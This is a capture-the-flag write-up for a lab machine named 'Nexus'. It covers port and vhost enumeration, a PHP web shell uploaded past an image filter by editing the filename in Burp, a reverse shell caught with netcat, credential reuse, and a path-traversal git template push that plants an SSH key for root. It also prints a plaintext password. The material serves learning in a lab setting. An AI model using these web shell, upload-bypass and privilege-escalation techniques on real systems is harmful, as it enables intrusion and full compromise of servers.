# Nexus
## Overview
| Difficulty | OS    | Tools                     |
| ---------- | ----- | ------------------------- |
| Easy       | Linux | nmap, gobuster, burpsuite |

## Enumeration
- Full port scan: `nmap -p- --min-rate 5000 -T4 <target_ip>`
- Detailed port scan: `nmap -sC -sV -p 22,80 <target_ip>`

![nmap screenshot](images/nmap.png)

- Navigating to http://<target_ip> returned "Hmm. We're having trouble finding that site." but it also redirected from that ip to "http://nexus.htb". To resolve the hostname, I added `<target_ip> nexus.htb` to /etc/hosts and the site was now accessible.
- Found nothing through manual enumeration or in source code so moved to gobuster.
- Gobuster common and small wordlists found nothing so moved from dir mode to vhosts mode which found two subdomains: `gobuster vhost -u nexus.htb -w /usr/share/wordlists/dirb/common.txt --append-domain`

![gobuster screenshot](images/gobuster.png)

- After adding billing.nexus.htb and git.nexus.htb to /etc/hosts, they became accessible.
- git.nexus.htb contained a password in commit history. Combining that password with the email address for the hiring manager listed on the main site (j.matthew@nexus.htb), I'm able to log into the billing page.

![email screenshot](images/email.png)

![env screenshot](images/env.png)

## Foothold
- On the dashboard of the billing page, I see Krayin is on version 2.2.0. After looking up that version, I find a remote code execution vulnerability: CVE-2026-38526. This CVE allows for uploading malicious php files inside the TinyMCE text editor (which has image upload capabilities) that runs code on the server.
- I then should test if that file upload only allows files or if other files can sneak through.
- I created a small php payload to try to upload: `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
- That file was not able to be uploaded as is so I renamed it shell.php.png and was able to upload.
- After capturing that file upload request in burpsuite via the proxy tab with intercept on, I modified the filename attribute to remove the .png but strategically left Content-Type as image/png to not mess up the upload.

![burpsuite screenshot](images/burpsuite.png)

- The upload worked and the site gave me the source of the image, which as intended, ended in .php. Navigating to the source of the image and adding ?cmd=id at the end of the url, I can verify I have successfully obtained remote code execution (RCE).

![rce screenshot](images/rce.png)

- Now that I verified RCE through the server running php code, I uploaded the "PHP PentestMonkey" reverse shell from revshells.com pointing at my host machine's IP, and after uploading that file the same way as before and accessing the url source (which ended in .php), I had my reverse shell from the terminal running a netcat listener: `nc -lvnp 9001`

![shell screenshot](images/shell.png)

- I stabilized the reverse shell so commands like Ctrl+C wouldn't break out of the entire connection:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z to background
stty raw -echo; fg
# Press enter twice
export TERM=xterm
stty rows <R> columns <C> # need if using fullscreen terminal apps like vim. find rows and columns for current terminal size by running `stty size` on host terminal
```

- I'm logged in as www-data and don't have access to /home/jones, where the user flag is presumably, so I need to find a way to escalate. The folder in $HOME/krayin has an env file which has creds to a mysql login. That password works alongside the username jones when trying to ssh and the user flag is in the home directory.

![mysql_creds screenshot](images/mysql_creds.png)

![user_flag screenshot](images/user_flag.png)

## Privilege Escalation
- Did not have permission to run `sudo -l` so moved on to linpeas and nothing immediately popped out
- Moved onto timer based jobs like systemd and cron.
- Found `gitea-template-sync.timer` after running `systemctl list-timers`. The timer activates a service so I inspected the service with `systemctl cat gitea-template-sync.service`
- The service runs `/usr/bin/python3 /etc/gitea/template-sync.py` as root. That python script clones template repos from the gitea instance on the local machine. The vulnerability is found in a couple lines in the script that when cloning, fails to sanitize the input allowing for placement of the files in any directory.

![python_vuln screenshot](images/python_vuln.png)

- I begin the process to drop an ssh key into ../../../../../root/.ssh/authorized_keys
- Generate ssh key: `ssh-keygen -t ed25519 -f /tmp/exploitkey -N ''`
- Log into http://git.nexus.htb as username jones with the same password for ssh
- Create a repository named "test" and check "Make repository a template"
- Clone that created repo on host machine: `git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/test.git`
- Inside that repo, ran a python file (found online) that creates a git tree structure to put the ssh keys in the correct location on the target box. Since git cannot make a tree entry named `..`, the script manually writes the object inside `.git`
- Force push the edit: `git push -u origin main --force`
- When the timer-based service runs, ssh as root: `ssh -i /tmp/exploitkey root@nexus.htb` and cat flag

![root_flag screenshot](images/root_flag.png)